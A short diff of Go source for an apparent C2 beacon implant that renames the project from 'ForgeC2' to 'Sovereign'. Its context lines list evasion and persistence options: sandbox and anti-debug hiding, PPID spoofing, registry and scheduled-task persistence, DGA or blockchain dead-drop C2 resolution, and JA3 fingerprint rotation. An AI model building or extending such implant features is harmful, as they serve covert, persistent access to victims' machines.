@@ -16,7 +16,7 @@ import (
 	"sync/atomic"
 	"time"
 
-	"github.com/forgec2/forgec2/pkg/protocol"
+	"github.com/r0si/sovereign/pkg/protocol"
 )
 
 // These variables are injected at compile time via -ldflags "-X main.C2URL=..."
@@ -82,7 +82,7 @@ var (
 	GhostModeStr            string            = "false"        // Compile-time ghost protocol (sandbox/anti-debug deep-hiding); also FORGEC2_GHOST_MODE=1 at runtime
 	PPIDSpoofStr            string            = "false"        // Compile-time PPID spoofing
 	PPIDSpoofParent         string            = "explorer.exe" // Parent process name used for PPID spoofing
-	PersistencePrefixStr    string            = ""             // Custom prefix for persistence artifacts (reg keys, task names, file names); default "ForgeC2"
+	PersistencePrefixStr    string            = ""             // Custom prefix for persistence artifacts (reg keys, task names, file names); default "Sovereign"
 	BeaconTransportStr      string            = "http"         // "http", "wss", "ssh" — transport protocol for beacon
 	C2ResolverStr           string            = ""             // dead-drop C2 resolver JSON (chain eth_call / dga); "" = use compiled-in C2 list only
 	ChameleonStr            string            = "false"        // per-dial uTLS JA3 rotation (off = stable Chrome Auto); also FORGEC2_CHAMELEON=1 at runtime
@@ -171,7 +171,7 @@ var ecdhSess *ecdhSession    // ECDH session for forward-secret encryption (nil 
 var inSandbox bool           // set by sandbox detection at startup
 var ppidSpoofEnabled bool    // PPID spoofing enabled via ldfags
 var ppidSpoofParent string   // parent process name used for PPID spoofing
-var persistencePrefix string // artifact name prefix for persistence (default "ForgeC2")
+var persistencePrefix string // artifact name prefix for persistence (default "Sovereign")
 var egressDetection bool     // parsed from EgressDetectionStr
 var AgentVersion = s(SAgentVersion)
 var maxRetries int             // parsed from MaxRetriesStr
